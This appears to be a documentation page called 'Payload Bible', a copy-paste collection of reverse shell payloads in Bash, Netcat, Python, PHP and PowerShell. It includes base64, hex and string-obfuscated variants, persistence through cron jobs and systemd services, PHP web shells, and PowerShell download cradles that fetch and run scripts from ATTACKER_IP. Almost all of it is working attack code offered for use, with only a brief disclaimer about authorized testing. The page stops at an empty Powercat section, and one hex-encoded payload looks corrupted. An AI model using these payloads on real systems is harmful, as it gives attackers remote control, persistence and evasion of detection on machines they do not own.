---
title: Payload 
description: Reverse shell payload collection ever assembled — every language, every platform, every encoding, every technique. Organized by language, platform, and method. Your one-stop copy-paste arsenal for authorized penetration testing.
navigation:
  icon: i-lucide-bomb
  title: Payload Bible
---

The only payload reference you will ever need. Every language. Every platform. Every encoding. Every trick.

::warning
**Replace these placeholders in EVERY payload below:**
- `ATTACKER_IP` → Your listener IP address
- `PORT` → Your listener port number
- All payloads are for **authorized penetration testing only**
::

::note
**Listener Quick Start** — Run one of these before triggering any payload:

```bash [Terminal]
# Basic
nc -lvnp PORT

# SSL
ncat --ssl -lvnp PORT

# Full TTY
socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT

# Metasploit
msfconsole -x "use exploit/multi/handler; set PAYLOAD <type>; set LHOST 0.0.0.0; set LPORT PORT; exploit -j"
```
::

## Bash / Shell

### Bash TCP

```bash [Bash Reverse Shell #1 — /dev/tcp]
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

```bash [Bash Reverse Shell #2 — bash -c wrapper]
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

```bash [Bash Reverse Shell #3 — exec redirect]
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash [Bash Reverse Shell #4 — exec full redirect]
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```

```bash [Bash Reverse Shell #5 — exec with bash]
exec 0<>/dev/tcp/ATTACKER_IP/PORT; exec 1>&0; exec 2>&0; bash
```

```bash [Bash Reverse Shell #6 — file descriptor loop]
bash -c 'exec 3<>/dev/tcp/ATTACKER_IP/PORT; while read -r cmd <&3; do eval "$cmd" 2>&3 >&3; done'
```

```bash [Bash Reverse Shell #7 — coproc]
bash -c 'coproc bash; exec 3<>/dev/tcp/ATTACKER_IP/PORT; cat <&${COPROC[0]} >&3 & cat <&3 >&${COPROC[1]}; kill %%'
```

```bash [Bash Reverse Shell #8 — readline]
bash -i 5<>/dev/tcp/ATTACKER_IP/PORT 0<&5 1>&5 2>&5
```

```bash [Bash Reverse Shell #9 — nohup background]
nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' &
```

```bash [Bash Reverse Shell #10 — disown]
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &' && disown
```

### Bash UDP

```bash [Bash UDP Reverse Shell #1]
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

```bash [Bash UDP Reverse Shell #2]
sh -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### sh Variants

```bash [sh Reverse Shell #1]
sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

```bash [sh Reverse Shell #2 — exec]
sh -c 'exec 3<>/dev/tcp/ATTACKER_IP/PORT; exec 0<&3; exec 1>&3; exec 2>&3; sh'
```

```bash [sh Reverse Shell #3 — pipe]
sh -i 2>&1 | nc ATTACKER_IP PORT
```

### Dash (Debian sh)

```bash [Dash Reverse Shell]
dash -c 'exec 3<>/dev/tcp/ATTACKER_IP/PORT; cat <&3 | while read line; do $line 2>&3 >&3; done'
```

### Zsh

```bash [Zsh Reverse Shell #1]
zsh -c 'zmodload zsh/net/tcp && ztcp ATTACKER_IP PORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

```bash [Zsh Reverse Shell #2]
zsh -c 'zmodload zsh/net/tcp; ztcp ATTACKER_IP PORT; zsh <&$REPLY >&$REPLY 2>&$REPLY'
```

### Ksh

```bash [Ksh Reverse Shell]
ksh -c 'ksh -i < /dev/tcp/ATTACKER_IP/PORT > /dev/tcp/ATTACKER_IP/PORT 2>&1'
```

### Csh / Tcsh

```bash [Csh Reverse Shell]
csh -c 'echo sh -i | nc ATTACKER_IP PORT'
```

### Encoded Bash

```bash [Base64 Encoded Bash Reverse Shell]
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" | base64
# Execute:
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=" | base64 -d | bash
```

```bash [Hex Encoded Bash Reverse Shell]
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" | xxd -p
# Execute:
echo "62617368202d69203e26202f6465762f7463702f41545441434b45525f49502f504f525420303e2631" | xxd -p -r | bash
```

```bash [URL Encoded Bash (For Web Injection)]
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2FPORT%200%3E%261%27
```

```bash [Octal Encoded Bash]
$'\142\141\163\150' -c '$'\142\141\163\150' -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

```bash [Variable Obfuscated Bash]
a='ba';b='sh';c=' -i >& /dev/tc';d='p/ATTACKER_IP/';e='PORT 0';f='>&1';$a$b$c$d$e$f
```

```bash [Reversed String Bash]
echo '1>&0 TROP/PI_REKCATTA/pct/ved/ &>i- hsab' | rev | bash
```

```bash [Whitespace Obfuscated Bash]
{bash,-i,>&,/dev/tcp/ATTACKER_IP/PORT,0>&1}
```

```bash [IFS Manipulation Bash]
IFS=,;B=bash${IFS}-i${IFS}>&${IFS}/dev/tcp/ATTACKER_IP/PORT${IFS}0>&1;$B
```

```bash [Brace Expansion Bash]
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=}|{base64,-d}|{bash,-i}
```

### Persistent / Auto-Reconnecting Bash

```bash [Reconnecting Bash — While Loop]
while true; do bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1; sleep 30; done
```

```bash [Reconnecting Bash — Until Loop]
until bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1; do sleep 60; done
```

```bash [Reconnecting Bash — Cron Job]
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1") | crontab -
```

```bash [Reconnecting Bash — systemd Timer]
echo -e '[Unit]\nDescription=Update\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/update.service && systemctl enable --now update
```

```bash [Reconnecting Bash — at job]
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" | at now + 1 minute
```

```bash [Reconnecting Bash — nohup background]
nohup bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1; sleep 30; done' &>/dev/null &
```

---

## Netcat

### GNU Netcat (supports -e)

```bash [Netcat -e /bin/bash]
nc -e /bin/bash ATTACKER_IP PORT
```

```bash [Netcat -e /bin/sh]
nc -e /bin/sh ATTACKER_IP PORT
```

```bash [Netcat -c]
nc -c /bin/bash ATTACKER_IP PORT
```

```bash [Netcat -c sh]
nc -c /bin/sh ATTACKER_IP PORT
```

```bash [Netcat -e cmd.exe (Windows)]
nc.exe -e cmd.exe ATTACKER_IP PORT
```

```bash [Netcat -e powershell (Windows)]
nc.exe -e powershell.exe ATTACKER_IP PORT
```

### OpenBSD Netcat (no -e flag)

```bash [Netcat mkfifo #1]
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

```bash [Netcat mkfifo #2]
rm /tmp/f; mkfifo /tmp/f; nc ATTACKER_IP PORT 0</tmp/f | /bin/sh > /tmp/f 2>&1
```

```bash [Netcat mkfifo #3 — bash]
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

```bash [Netcat mkfifo #4 — custom path]
rm /tmp/backpipe; mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc ATTACKER_IP PORT 1>/tmp/backpipe
```

```bash [Netcat mkfifo #5 — mknod]
mknod /tmp/pipe p && nc ATTACKER_IP PORT 0</tmp/pipe | /bin/bash 1>/tmp/pipe
```

```bash [Netcat pipe chain]
nc ATTACKER_IP PORT | /bin/sh | nc ATTACKER_IP PORT+1
```

```bash [Netcat two-port relay]
nc ATTACKER_IP PORT 0<&0 | /bin/bash 2>&0 | nc ATTACKER_IP PORT
```

### Ncat (Nmap Netcat)

```bash [Ncat Reverse Shell]
ncat ATTACKER_IP PORT -e /bin/bash
```

```bash [Ncat SSL Reverse Shell]
ncat --ssl ATTACKER_IP PORT -e /bin/bash
```

```bash [Ncat SSL with Certificate Verification]
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem ATTACKER_IP PORT -e /bin/bash
```

```bash [Ncat UDP Reverse Shell]
ncat -u ATTACKER_IP PORT -e /bin/bash
```

```bash [Ncat with Proxy]
ncat --proxy proxy.internal:8080 --proxy-type http ATTACKER_IP PORT -e /bin/bash
```

```bash [Ncat SOCKS Proxy]
ncat --proxy proxy.internal:1080 --proxy-type socks5 ATTACKER_IP PORT -e /bin/bash
```

### BusyBox Netcat

```bash [BusyBox nc #1]
busybox nc ATTACKER_IP PORT -e /bin/sh
```

```bash [BusyBox nc #2 — ash]
busybox nc ATTACKER_IP PORT -e /bin/ash
```

```bash [BusyBox nc #3 — mkfifo]
rm /tmp/f; mkfifo /tmp/f; busybox nc ATTACKER_IP PORT < /tmp/f | /bin/sh > /tmp/f 2>&1
```

### Netcat Persistent

```bash [Netcat Reconnecting Loop]
while true; do rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f; sleep 30; done
```

```bash [Netcat Background Persistent]
nohup bash -c 'while true; do nc -e /bin/bash ATTACKER_IP PORT; sleep 60; done' &
```

---

## Python

### Python 3 Reverse Shells

```python [Python 3 Reverse Shell #1 — subprocess]
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python [Python 3 Reverse Shell #2 — bash]
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

```python [Python 3 Reverse Shell #3 — PTY spawn]
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

```python [Python 3 Reverse Shell #4 — PTY sh]
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python [Python 3 Reverse Shell #5 — os.system]
python3 -c 'import socket,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];os.system("/bin/bash -i")'
```

```python [Python 3 Reverse Shell #6 — os.execve]
python3 -c 'import socket,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];os.execve("/bin/sh",["/bin/sh","-i"],os.environ)'
```

```python [Python 3 Reverse Shell #7 — Popen]
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",PORT));subprocess.Popen(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s)'
```

```python [Python 3 Reverse Shell #8 — select loop]
python3 -c '
import socket,subprocess,os,select
s=socket.socket()
s.connect(("ATTACKER_IP",PORT))
p=subprocess.Popen(["/bin/bash","-i"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
while True:
    r,_,_=select.select([s,p.stdout,p.stderr],[],[])
    if s in r:
        d=s.recv(1024)
        if not d:break
        p.stdin.write(d)
        p.stdin.flush()
    if p.stdout in r:
        s.send(p.stdout.read1())
    if p.stderr in r:
        s.send(p.stderr.read1())
'
```

```python [Python 3 Reverse Shell #9 — threading]
python3 -c '
import socket,subprocess,threading,os
s=socket.socket()
s.connect(("ATTACKER_IP",PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

```python [Python 3 Reverse Shell #10 — short]
python3 -c 'a=__import__;s=a("socket").socket();s.connect(("ATTACKER_IP",PORT));[a("os").dup2(s.fileno(),i) for i in range(3)];a("subprocess").call(["/bin/sh","-i"])'
```

### Python 2 Reverse Shells

```python [Python 2 Reverse Shell #1]
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python [Python 2 Reverse Shell #2 — PTY]
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

```python [Python 2 Reverse Shell #3 — os.popen]
python -c 'import socket,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh -i")'
```

### Python Windows Reverse Shells

```python [Python Windows #1 — cmd.exe]
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",PORT));subprocess.Popen(["cmd.exe"],stdin=s,stdout=s,stderr=s)'
```

```python [Python Windows #2 — powershell]
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",PORT));subprocess.Popen(["powershell.exe"],stdin=s,stdout=s,stderr=s)'
```

```python [Python Windows #3 — interactive loop]
python3 -c '
import socket,subprocess
s=socket.socket()
s.connect(("ATTACKER_IP",PORT))
while True:
    data=s.recv(1024).decode()
    if data.lower().strip()=="exit":break
    proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    output=proc.stdout.read()+proc.stderr.read()
    s.send(output)
s.close()
'
```

### Python SSL Encrypted

```python [Python 3 SSL Reverse Shell #1]
python3 -c '
import socket,subprocess,os,ssl
context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname=False
context.verify_mode=ssl.CERT_NONE
s=socket.socket()
ss=context.wrap_socket(s)
ss.connect(("ATTACKER_IP",PORT))
os.dup2(ss.fileno(),0)
os.dup2(ss.fileno(),1)
os.dup2(ss.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

```python [Python 3 SSL Reverse Shell #2 — server_hostname]
python3 -c '
import socket,subprocess,os,ssl
s=socket.socket()
context=ssl.create_default_context()
context.check_hostname=False
context.verify_mode=ssl.CERT_NONE
ss=context.wrap_socket(s,server_hostname="ATTACKER_IP")
ss.connect(("ATTACKER_IP",PORT))
os.dup2(ss.fileno(),0);os.dup2(ss.fileno(),1);os.dup2(ss.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'
```

### Python Auto-Reconnecting

```python [Python 3 Reconnecting Reverse Shell]
python3 -c '
import socket,subprocess,os,time
while True:
    try:
        s=socket.socket()
        s.connect(("ATTACKER_IP",PORT))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        subprocess.call(["/bin/bash","-i"])
    except:pass
    finally:
        try:s.close()
        except:pass
    time.sleep(30)
'
```

```python [Python 3 Reconnecting SSL]
python3 -c '
import socket,subprocess,os,ssl,time
while True:
    try:
        context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname=False
        context.verify_mode=ssl.CERT_NONE
        s=socket.socket()
        ss=context.wrap_socket(s)
        ss.connect(("ATTACKER_IP",PORT))
        os.dup2(ss.fileno(),0);os.dup2(ss.fileno(),1);os.dup2(ss.fileno(),2)
        subprocess.call(["/bin/bash","-i"])
    except:pass
    time.sleep(60)
'
```

### Python IPv6

```python [Python 3 IPv6 Reverse Shell]
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("ATTACKER_IPV6",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python Encoded

```python [Python Base64 Encoded Execution]
python3 -c 'import base64;exec(base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIkFUVEFDS0VSX0lQIixQT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p"))'
```

```python [Python Hex Encoded Execution]
python3 -c 'exec(bytes.fromhex("696d706f727420736f636b65742c737562707260636573732c6f733b733d736f636b65742e736f636b657428293b732e636f6e6e65637428282241545441434b45525f4950222c504f52542929").decode())'
```

---

## PHP

### PHP Reverse Shells

```php [PHP exec #1]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php [PHP exec #2 — bash]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

```php [PHP shell_exec]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php [PHP system]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("/bin/sh -i <&3 >&3 2>&3");'
```

```php [PHP passthru]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

```php [PHP popen]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("/bin/sh -i <&3 >&3 2>&3","r");'
```

```php [PHP proc_open]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

```php [PHP proc_open — bash]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

```php [PHP backtick operator]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);`/bin/sh -i <&3 >&3 2>&3`;'
```

```php [PHP pcntl_exec]
php -r '$sock=fsockopen("ATTACKER_IP",PORT);pcntl_exec("/bin/sh",array("-i"));'
```

### PHP Full Reverse Shells (Web Upload)

```php [PHP Full Reverse Shell — proc_open (Recommended)]
<?php
set_time_limit(0);
$ip = 'ATTACKER_IP';
$port = PORT;
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { die(); }
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
if (!is_resource($process)) { die(); }
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
    if (feof($sock) || feof($pipes[1])) { break; }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $write_a = NULL; $error_a = NULL;
    stream_select($read_a, $write_a, $error_a, NULL);
    if (in_array($sock, $read_a)) { fwrite($pipes[0], fread($sock, 4096)); }
    if (in_array($pipes[1], $read_a)) { fwrite($sock, fread($pipes[1], 4096)); }
    if (in_array($pipes[2], $read_a)) { fwrite($sock, fread($pipes[2], 4096)); }
}
fclose($sock);
fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
proc_close($process);
?>
```

```php [PHP Full Reverse Shell — socket functions]
<?php
$ip = 'ATTACKER_IP';
$port = PORT;
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($sock, $ip, $port);
socket_write($sock, "Connected\n");
while ($cmd = socket_read($sock, 2048)) {
    $output = shell_exec($cmd);
    socket_write($sock, $output, strlen($output));
}
socket_close($sock);
?>
```

```php [PHP Full Reverse Shell — stream_socket]
<?php
$sock = stream_socket_client("tcp://ATTACKER_IP:PORT");
stream_set_blocking($sock, false);
$proc = proc_open('/bin/bash -i', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
?>
```

### PHP Web Shells (Command Execution)

```php [PHP Web Shell — GET parameter]
<?php echo system($_GET['cmd']); ?>
```

```php [PHP Web Shell — POST parameter]
<?php if(isset($_POST['c'])){echo '<pre>'.shell_exec($_POST['c']).'</pre>';} ?>
```

```php [PHP Web Shell — exec]
<?php echo exec($_GET['cmd']); ?>
```

```php [PHP Web Shell — passthru]
<?php passthru($_GET['cmd']); ?>
```

```php [PHP Web Shell — backtick]
<?php echo `{$_GET['cmd']}`; ?>
```

```php [PHP Web Shell — eval]
<?php @eval($_REQUEST['e']); ?>
```

```php [PHP Web Shell — assert]
<?php @assert($_REQUEST['cmd']); ?>
```

```php [PHP Web Shell — preg_replace (PHP < 7)]
<?php @preg_replace('/.*/e', $_REQUEST['cmd'], ''); ?>
```

```php [PHP Web Shell — base64 decode]
<?php echo shell_exec(base64_decode($_GET['c'])); ?>
```

```php [PHP Web Shell — password protected]
<?php if($_POST['key']==='s3cr3t'){echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';} ?>
```

```php [PHP Web Shell — hidden in image comment]
<?php /* GIF89a */ echo shell_exec($_GET['cmd']); ?>
```

```php [PHP Web Shell — create_function (PHP < 8)]
<?php $f=create_function('','return shell_exec($_GET["cmd"]);');echo $f(); ?>
```

```php [PHP Web Shell — array_map]
<?php echo implode(array_map(function($c){return shell_exec($c);},[$_GET['cmd']])); ?>
```

```php [PHP Web Shell — minimal (14 bytes)]
<?=`$_GET[c]`?>
```

```php [PHP Web Shell — minimal (17 bytes)]
<?=shell_exec($_GET['c'])?>
```

---

## PowerShell

### PowerShell TCP Reverse Shells

```powershell [PowerShell Reverse Shell #1 — TCPClient]
powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

```powershell [PowerShell Reverse Shell #2 — Simplified]
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
```

```powershell [PowerShell Reverse Shell #3 — StreamReader/Writer]
powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$true;while($c.Connected){$w.Write('PS '+(pwd).Path+'> ');$cmd=$r.ReadLine();if($cmd -eq 'exit'){break};$out=(iex $cmd 2>&1|Out-String);$w.Write($out)};$c.Close()"
```

```powershell [PowerShell Reverse Shell #4 — via cmd.exe]
cmd /c powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
```

```powershell [PowerShell Reverse Shell #5 — Hidden Window]
powershell -nop -ep bypass -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
```

```powershell [PowerShell Reverse Shell #6 — System.Net.Sockets]
powershell -nop -ep bypass -c "$s=New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp);$s.Connect('ATTACKER_IP',PORT);$b=New-Object byte[] 1024;while($true){$i=$s.Receive($b);if($i -eq 0){break};$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Send($rb)};$s.Close()"
```

### PowerShell Base64 Encoded

```powershell [PowerShell Base64 — Encoding Steps]
# Step 1: Create payload
$payload = '$c=New-Object Net.Sockets.TCPClient("ATTACKER_IP",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()'

# Step 2: Encode
$bytes = [Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded

# Step 3: Execute
powershell -nop -ep bypass -enc <ENCODED_STRING>
```

### PowerShell Download Cradles

```powershell [PS Download Cradle #1 — WebClient]
powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

```powershell [PS Download Cradle #2 — Invoke-WebRequest]
powershell -nop -ep bypass -c "IEX(Invoke-WebRequest -Uri 'http://ATTACKER_IP/shell.ps1' -UseBasicParsing).Content"
```

```powershell [PS Download Cradle #3 — Invoke-RestMethod]
powershell -nop -ep bypass -c "IEX(Invoke-RestMethod -Uri 'http://ATTACKER_IP/shell.ps1')"
```

```powershell [PS Download Cradle #4 — System.Net.Http]
powershell -nop -ep bypass -c "$h=New-Object Net.Http.HttpClient;IEX($h.GetStringAsync('http://ATTACKER_IP/shell.ps1').Result)"
```

```powershell [PS Download Cradle #5 — BitsTransfer]
powershell -nop -ep bypass -c "Import-Module BitsTransfer;Start-BitsTransfer -Source 'http://ATTACKER_IP/shell.ps1' -Destination 'C:\Users\Public\s.ps1';IEX(gc C:\Users\Public\s.ps1 -Raw)"
```

```powershell [PS Download Cradle #6 — XML]
powershell -nop -ep bypass -c "$x=New-Object Xml.XmlDocument;$x.Load('http://ATTACKER_IP/payload.xml');IEX($x.command.execute)"
```

```powershell [PS Download Cradle #7 — COM Object]
powershell -nop -ep bypass -c "$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$false;$ie.navigate('http://ATTACKER_IP/shell.ps1');while($ie.busy){Start-Sleep -Milliseconds 100};IEX($ie.document.body.innerText);$ie.Quit()"
```

### PowerShell Obfuscated

```powershell [PS Obfuscated #1 — Concatenation]
powershell -nop -ep bypass -c "$a='Ne'+'w-Ob'+'ject';$b='Net'+'.So'+'cke'+'ts.TC'+'PCl'+'ient';$c=&($a) $b('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$d=0..65535|%{0};while(($i=$s.Read($d,0,$d.Length)) -ne 0){$e=(New-Object Text.ASCIIEncoding).GetString($d,0,$i);$f=(iex $e 2>&1|Out-String);$g=([Text.Encoding]::ASCII).GetBytes($f);$s.Write($g,0,$g.Length)};$c.Close()"
```

```powershell [PS Obfuscated #2 — Replace]
powershell -nop -ep bypass -c "$x='NRRRew-ORRRbject NRRRet.SRRRockets.TCRRRPCRRRlient'.Replace('RRR','');$c=&([scriptblock]::Create($x))('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
```

```powershell [PS Obfuscated #3 — Invoke-Expression alias]
powershell -nop -ep bypass -c "sal a New-Object;$c=a Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(a Text.ASCIIEncoding).GetString($b,0,$i);$r=(.(gcm *ke-E*)$d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
```

### PowerShell ConPTY (Full Interactive)

```powershell [ConPTY Shell — Full Interactive Windows Reverse Shell]
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell -RemoteIp ATTACKER_IP -RemotePort PORT -Rows 40 -Cols 120
```

### Powercat

```powershell [Powercat — Load and Execute]
